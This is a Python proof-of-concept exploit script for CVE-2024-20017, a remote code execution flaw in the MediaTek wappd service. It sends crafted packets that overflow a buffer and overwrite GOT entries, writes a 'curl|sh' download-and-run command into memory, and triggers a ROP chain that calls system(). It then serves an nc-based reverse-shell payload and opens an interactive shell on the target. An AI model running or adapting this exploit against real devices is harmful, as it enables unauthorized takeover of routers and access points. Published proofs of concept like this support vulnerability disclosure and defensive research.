#!/usr/bin/env python3
import argparse
import sys
from collections import namedtuple
from pwn import *

context.log_level = 'error'

# some valid readable address
READABLE_ADDR = 0x400000

# Addresses. NOTE: these values will change for different build flags, compilers, etc. Adjust as
# needed.
GOT_BASE            = 0x497240
GOT_SYSTEM          = 0x402176
GOT_READ            = 0x497140
GOT_EXIT            = 0x402556
GADGET_RET          = 0x46fc40 # ret;
GADGET_POP5         = 0x42a144 # pop 5 and ret
GADGET_POP_RDI_RBP  = 0x4591d4 # pop rdi; pop rbp; ret;

# ROP chain
# pop rdi; pop rbp ret; | <GOT buffer>+<GOT buffer> |
ROP_CHAIN = p64(GADGET_POP_RDI_RBP) + p64(GOT_BASE) + p64(GOT_BASE)
# bare `ret;` to align the stack
ROP_CHAIN += p64(GADGET_RET)
# system() and exit()
ROP_CHAIN += p64(GOT_SYSTEM) + p64(GOT_EXIT)

# Namedtuple for target
Target = namedtuple('Target', ['host', 'port'])


def create_base():
    """
    create a basic SSB payload packet
    """
    # iapp header
    header = p8(0)      # version
    header += p8(50)    # command
    header += p16(0)    # ident
    header += p16(0x60) # length

    # SSB struct frame
    ssb_pkt = p8(0x23) * 8     # char buf[8], InitVec
    # use big-endian here to simulate network byte order
    ssb_pkt += p16(0xd0, endian='big')  # u16 Length

    final_pkt = header + ssb_pkt
    return final_pkt


def create(write_addr, write_cont):
    """
    Compose the payload packet to trigger the overflow and write 4-bytes of `write_cont` to
    `write_addr`.
    """
    # Create base SSB packet
    final_pkt = create_base()

    # Padding
    final_pkt += b"\x11" * 96

    remaining_pad = 80
    # ROP chain:
    final_pkt += ROP_CHAIN # 32 bytes
    remaining_pad -= len(ROP_CHAIN)

    # Padding
    final_pkt += b"6" * (remaining_pad)

    # WRITE WHERE
    final_pkt += p64(write_addr)
    final_pkt += p32(0)

    # WRITE WHAT (4 bytes), will be decremented by 8
    final_pkt += p32(write_cont + 8)

    # need valid ptr addresses to readable to avoid a crash here
    final_pkt += p64(READABLE_ADDR)
    final_pkt += p64(READABLE_ADDR)

    return final_pkt


def trigger_tcp(target: Target):
    """send a tcp request packet to the SSB handler"""
    trig = create_base()
    conn_tcp = remote(target.host, target.port, typ='tcp')
    conn_tcp.send(trig)
    conn_tcp.close()


def write_buffer_to_target(target: Target, start_addr: int, data, size:int):
    """
    Use the 4-byte write primitive provided by the OidReq pointer overwrite to iteratively write
    the contents of `data` starting at address `start_addr`.
    """
    context.log_level = 'info'
    bytes_left = size
    cursor = start_addr
    connection = remote(target.host, target.port, typ='udp')

    print(f"[+] Writing chunked data starting at {start_addr:#x}...")

    # chunk data up into 4-byte chunks and send
    while bytes_left > 0:
        payload1 = None

        # handle remaining bytes at the end of the buf if len is not divisible by 4
        if len(data) < 4:
            chunk = data + (b"\x00" * (4 - len(data)))
            chunk = u32(chunk)
            payload1 = create(write_addr=cursor, write_cont=chunk)
            connection.send(payload1)
            print("[*] CHUNK")
            break

        # chunk the data and adjust indices
        chunk = data[:4]
        data = data[4:]
        bytes_left -= 4

        # unpack chunk and construct the payload
        chunk = u32(chunk)
        payload1 = create(write_addr=cursor, write_cont=chunk)
        cursor += 4

        # send
        connection.send(payload1)
        print("[*] CHUNK")

    connection.close()

def serve_rev_shell_payload(host: str, port: int):
    """
    serve reverse shell payload and handle incoming reverse shell connection
    """

    # these commands will be returned to the target and piped to a shell
    reverse_shell_cmd   = "rm -f /tmp/f; mkfifo /tmp/f;"
    reverse_shell_cmd   += f"(cat /tmp/f | /bin/bash -i 2>&1 | nc {host} {port} >/tmp/f &)"
    reverse_shell_cmd = reverse_shell_cmd.encode()

    http_head = f"HTTP/1.1 200 OK\r\nContent-Length: {len(reverse_shell_cmd)}\r\n"
    http_head += "Connection: Closed\r\n\r\n"
    http_head = http_head.encode()

    full_response = http_head + reverse_shell_cmd + b"\r\n\r\n"

    # handle the http request to serve script to spawn reverse shell
    listener = listen(port)
    listener.settimeout(1)
    http = listener.wait_for_connection()
    if http.connected():
        listener.sendline(full_response)
        listener.close()
    else:
        print("=ERROR=: Timed out waiting for staging connection, exploit likely failed")
        sys.exit(1)

    # wait for the incoming reverse shell connection; bail if we don't get it in a second.
    listener = listen(port)
    listener.settimeout(1)
    context.log_level = 'info'
    revshell = listener.wait_for_connection()
    if revshell.connected():
        print("[+] ~~~ <REVERSE SHELL START> ~~~")
        listener.interactive()
    else:
        print("[!] =ERROR=: Timed out waiting for reverse shell connection, exploit likely failed")
        sys.exit(1)


def main(args):
    """
    main function
    """
    args = poc_parser.parse_args()
    target = Target(args.target_ip, args.target_port)

    # iteratively write the command into the GOT segment starting at GOT_BASE
    command  = f"curl {args.lhost}:{args.lport}|sh;\x00"
    command = command.encode()
    print(f"[+] Sending payload to write command string to GOT @ {GOT_BASE:#x}")
    write_buffer_to_target(target, GOT_BASE-4, command, len(command))

    # create the packet to corrupt read() GOT to take control of execution, done in two steps to
    # overwrite both upper and lower 4 bytes of the entry to avoid crashing in case the symbol got
    # resolved before we get to it.
    packet_1 = create(write_addr=GOT_READ-4, write_cont=GADGET_POP5)
    packet_2 = create(write_addr=GOT_READ, write_cont=0)

    print("[+] Sending payload to corrupt read() GOT entry")
    context.log_level = 'error'
    conn = remote(target.host, target.port, typ='udp')
    conn.send(packet_1)
    conn.send(packet_2)
    conn.close()
    sleep(0.5)

    print("[+] Sending TCP payload to trigger corrupted read() entry and start ROP")
    trigger_tcp(target)

    # serve the reverse shell payload and then handle the incoming rev shell connection
    print("[+] Ready to handle incoming reverse shell...")
    serve_rev_shell_payload(args.lhost, args.lport)


if __name__ == "__main__":
    poc_parser = argparse.ArgumentParser(
        add_help=True,
        description='cve-2024-20017: mtk7622 wappd RCE, GOT overwrite (partial RELRO) -> reverse shell (by @hyprdude)',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    poc_parser.add_argument(
        'target_ip',
        help='IP address of host running the service')
    poc_parser.add_argument(
        '--target_port',
        default=3517,
        help="Target port",
        type=int)
    poc_parser.add_argument(
        '--lhost',
        default="127.0.0.1",
        help="Bind IP for reverse shell listener",
        type=str)
    poc_parser.add_argument(
        '--lport',
        default=1337,
        help="Bind port for reverse shell listener",
        type=int)

    arguments = poc_parser.parse_args()
    main(arguments)
